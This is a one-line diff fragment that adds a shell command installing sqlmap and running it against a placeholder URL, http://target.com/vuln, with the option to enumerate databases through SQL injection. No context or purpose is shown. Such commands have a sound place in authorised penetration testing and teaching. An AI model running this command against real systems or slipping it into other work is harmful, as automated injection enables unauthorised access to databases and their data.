@@ -1,0 +1,1 @@
+sudo apt install -y sqlmap && sqlmap -u http://target.com/vuln --dbs
